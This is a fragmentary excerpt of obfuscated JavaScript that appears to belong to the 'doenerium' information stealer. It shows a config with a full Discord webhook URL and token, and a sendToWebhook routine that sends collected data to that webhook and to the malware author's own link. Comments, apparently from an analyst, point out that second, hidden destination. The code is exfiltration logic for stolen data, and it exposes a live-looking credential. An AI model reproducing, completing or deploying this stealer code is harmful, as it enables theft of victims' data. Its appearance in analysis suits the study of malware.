...
var config = {
    brand: 'doenerium_',
    webhook: 'https://discord.com/api/webhooks/1063447584758313001/hFKSz4QG-tsMVCd9lQFtTHTuBLi6xLJnCiB-u8biK5WawoTsxLm8QZZuMTGO9aQNjeHx', // OH DOENER WEBHOOK!
...
function sendToWebhook(_0xc79c5f) {
  ...
  ;[config.webhook, config.webhook_link].forEach(async (url) => {
    var _0xbc253e = new URL(url), // it sends to your webhook and also to doener.
      _0x534334 = {
